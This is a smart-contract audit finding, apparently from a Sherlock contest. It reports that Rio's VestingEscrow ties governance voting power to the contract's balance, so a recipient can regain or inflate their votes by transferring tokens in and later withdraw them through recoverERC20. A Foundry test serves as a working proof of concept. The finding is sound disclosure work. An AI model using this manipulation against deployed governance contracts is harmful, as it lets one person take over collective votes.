# Voting Escrow Recipient can increase his voting power or regain his voting power after claiming all the vested tokens

## Summary
Recipients can increase their voting power or regain their voting power after claiming all the vested tokens

## Vulnerability Detail
The Vesting Escrow contract allows recipients to receive vesting tokens and based on that tokens it gives recipients the voting power. When the recipient claims all the vested tokens, the voting power of the user becomes [zero](https://github.com/sherlock-audit/2024-01-rio-vesting-escrow/blob/2d14c2b84b69c53a45c81aa4f907af9617f9a94f/rio-vesting-escrow/test/VestingEscrow.t.sol#L229). And the recipient no longer can participate in the governance.

The problem is that the voting power depends on the [contract balance](https://github.com/sherlock-audit/2024-01-rio-vesting-escrow/blob/2d14c2b84b69c53a45c81aa4f907af9617f9a94f/rio-vesting-escrow/src/VestingEscrow.sol#L152). As written in the VestingEscrow#vote comment; "Participate in a governance vote using all available tokens on the contract's balance."

The recipient/user can easily increase the contract balance by sending ERC20 tokens directly to the contract. By sending the tokens, contract balance will increase, when contract balance will increase, user's voting power/balance will increase too. This can be done to regain or massively increase the voting power.

There is also a [recoverERC20](https://github.com/sherlock-audit/2024-01-rio-vesting-escrow/blob/2d14c2b84b69c53a45c81aa4f907af9617f9a94f/rio-vesting-escrow/src/VestingEscrow.sol#L202C14-L202C26) function also present which allows the recipient/user to withdraw any ERC20 tokens (except for unclaim+locked). That's why user can deposit & withdraw freely, without risking of freezing his funds.

**Also, a user might get `revokeAll()` due to some legal documentation, then the user can get back his voting rights by exploiting this vulnareblity.** As `revokeAll()` function is in place so the org deploying the vesting escrow can clawback all the tokens, when something written into a legal contract surpasses. If the user breaks any legal conditions or do something malicious with the voting power, the owner of the contract will call `revokeAll()` which will clawback `locked + unclaimed` tokens and users' voting power will become zero.

## Proof-of-Concept
Add this test into the `VestingEsrow.t.sol` & run `forge test --mt testIncreaseVotingPowerOrRegainVotingPowerAfterClaimAll_PoC -vv`
```solidity
   function testIncreaseVotingPowerOrRegainVotingPowerAfterClaimAll_PoC() public {
        vm.warp(endTime);

        vm.prank(recipient);
        deployedVesting.delegate(ozVotingAdaptor.encodeDelegateCallData(address(deployedVesting)));

        console.log("voting power before claim", token.getVotes(address(deployedVesting)));
        assertEq(token.getVotes(address(deployedVesting)), token.balanceOf(address(deployedVesting)));

        vm.prank(recipient);
        deployedVesting.claim(recipient, type(uint256).max);

        //> Voting power = Zero, after claim
        assertEq(token.getVotes(address(deployedVesting)), 0);
        console.log("voting power after claim", token.getVotes(address(deployedVesting)));

        vm.prank(recipient);
        deal(address(token), recipient, 5 ether);
        token.transfer(address(deployedVesting), 5 ether);
        console.log("voting power increased", token.getVotes(address(deployedVesting)));
        //> Voting power increases after direct tokens transfer to the vesting contract
        assertEq(token.getVotes(address(deployedVesting)), token.balanceOf(address(deployedVesting)));
        assertEq(token.balanceOf(address(deployedVesting)), 5 ether);

        vm.prank(recipient);
        deployedVesting.delegate(ozVotingAdaptor.encodeDelegateCallData(address(deployedVesting)));

        uint256 proposalId = createProposal();
        uint256 votingBalance = token.getVotes(address(deployedVesting));

        vm.roll(block.number + 1);

        vm.prank(recipient);
        deployedVesting.vote(ozVotingAdaptor.encodeVoteCallData(proposalId, uint8(VoteType.For)));

        (uint256 againstVotes, uint256 forVotes, uint256 abstainVotes) = governor.proposalVotes(proposalId);
        assertEq(forVotes, votingBalance);
        assertEq(againstVotes, 0);
        assertEq(abstainVotes, 0);
    }
```

## Impact
- Governance Compromised
This will compromise the Governance, as users can increase their voting power (as much as they want), more voting power then they were initially assigned to. Or at least regain their voting power whenever they want (after claim all). And a malicous user can get voting rights even after getting revoked.

## Recommendation
To completely mitigate this issue, The voting power should not be dependent on the contract balance. To make this vulnerability hard to exploit, Remove recoverERC20.

I encourage the Rio team to discover better ways to handle this issue. Thanks!
